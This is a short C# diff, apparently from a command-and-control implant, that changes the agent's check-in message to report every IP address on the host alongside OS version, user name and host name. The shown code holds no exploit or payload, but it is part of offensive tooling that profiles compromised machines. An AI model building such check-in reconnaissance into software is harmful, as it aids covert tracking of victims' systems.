@@ -3,6 +3,7 @@ using Agent.Models;
 using Agent.Utilities;
 using System.Diagnostics;
 using System.Net;
+using System.Net.NetworkInformation;
 
 namespace Agent
 {
@@ -70,7 +71,7 @@ namespace Agent
             {
                 action = "checkin",
                 //ips = Dns.GetHostEntry(Dns.GetHostName()).AddressList.Select(a => a.ToString()).ToArray(),
-                ips = new string[] { "127.0.0.1" },
+                ips = this.GetIPAddresses(),
                 os = Environment.OSVersion.ToString(),
                 user = Environment.UserName,
                 host = Dns.GetHostName(),
@@ -111,6 +112,20 @@ namespace Agent
         private void updateAgentInfo(CheckinResponse res)
         {
             this.config.uuid = res.id;
+        }
+
+        private List<string> GetIPAddresses()
+        {
+            List<string> ipAddresses = new List<string>();
+            var netInterface = NetworkInterface.GetAllNetworkInterfaces();
+
+            foreach(var netInf in netInterface)
+            {
+                foreach (var ipProp in netInf.GetIPProperties().UnicastAddresses){
+                    ipAddresses.Add(ipProp.Address.ToString());
+                }
+            }
+            return ipAddresses;
         }
 
         private async void OnTaskingReceived(object sender, TaskingReceivedArgs args)
